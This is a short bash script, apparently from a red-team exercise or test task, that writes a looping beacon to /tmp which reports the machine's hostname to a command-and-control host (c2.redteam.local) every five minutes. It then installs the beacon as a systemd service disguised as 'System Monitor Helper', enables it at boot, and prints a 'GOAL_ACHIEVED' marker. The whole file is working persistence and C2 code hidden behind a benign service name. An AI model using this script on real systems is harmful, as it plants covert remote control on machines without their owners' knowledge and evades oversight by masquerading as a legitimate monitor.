#!/bin/bash
set -e

# Unmask the service if it was masked
sudo systemctl unmask sysmon-helper 2>/dev/null || true

# Write the beacon script
cat > /tmp/beacon.sh << 'BEACON_EOF'
#!/bin/bash
while true; do
  host="$(hostname)"
  curl -sk "http://c2.redteam.local/beacon?host=${host}" || true
  sleep 300
done
BEACON_EOF

chmod +x /tmp/beacon.sh

# Write the systemd service unit
cat > /etc/systemd/system/sysmon-helper.service << 'SERVICE_EOF'
[Unit]
Description=System Monitor Helper
After=network.target

[Service]
ExecStart=/tmp/beacon.sh
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE_EOF

# Reload systemd and start the service
sudo systemctl daemon-reload
sudo systemctl enable sysmon-helper
sudo systemctl start sysmon-helper

echo "GOAL_ACHIEVED: c2 beacon installed"
